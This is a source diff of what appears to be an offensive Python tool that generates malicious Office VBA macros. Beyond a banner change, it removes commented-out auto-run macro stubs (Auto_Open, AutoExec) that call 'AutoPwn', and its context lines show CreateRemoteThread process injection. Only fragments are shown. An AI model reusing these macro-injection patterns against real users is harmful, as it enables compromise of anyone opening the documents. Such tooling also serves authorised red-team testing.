@@ -21,12 +21,14 @@ from termcolor import colored
 version = "0.21 BETA"
 
 def printBanner():
-	print colored("              __________", "red")                
-	print colored("__  _  __ ____\______   \__  _  ______", "red")  
-	print colored("\ \/ \/ // __ \|     ___/\ \/ \/ /    \ ", "red")
-	print colored(" \     /\  ___/|    |     \     /   |  \\", "red")
-	print colored(" \/\_/  \___  >____|      \/\_/|___|  /", "red")
-	print colored("            \/                      \/ ", "red")
+
+	print colored("              __________               .__               ","red")
+	print colored("__  _  __ ____\______   \__  _  ______ |__| ______ ____  ","red")
+	print colored("\ \/ \/ // __ \|     ___/\ \/ \/ /    \|  |/  ___// __ \ ","red")
+	print colored(" \     /\  ___/|    |     \     /   |  \  |\___ \\  ___/ ","red")
+	print colored("  \/\_/  \___  >____|      \/\_/|___|  /__/____  >\___  >","red")
+	print colored("             \/                      \/        \/     \/ ","red")
+
 	print colored("[*] Version %s" % version, "blue")
 
 def validateIP(ipaddr):
@@ -576,18 +578,6 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "DieTotal\r\n",
 "AutoPwn\r\n",
 "End Sub\r\n"]
-#"Sub Auto_Open()\r\n",
-#"DieTotal\r\n",
-#"AutoPwn\r\n",
-#"End Sub\r\n",
-#"Sub AutoExec()\r\n",
-#"DieTotal\r\n",
-#"AutoPwn\r\n",
-#"End Sub\r\n",
-#"Sub Auto_Exec()\r\n",
-#"DieTotal\r\n",
-#"AutoPwn\r\n",
-#"End Sub"]
 
 # Open and write to text file
 
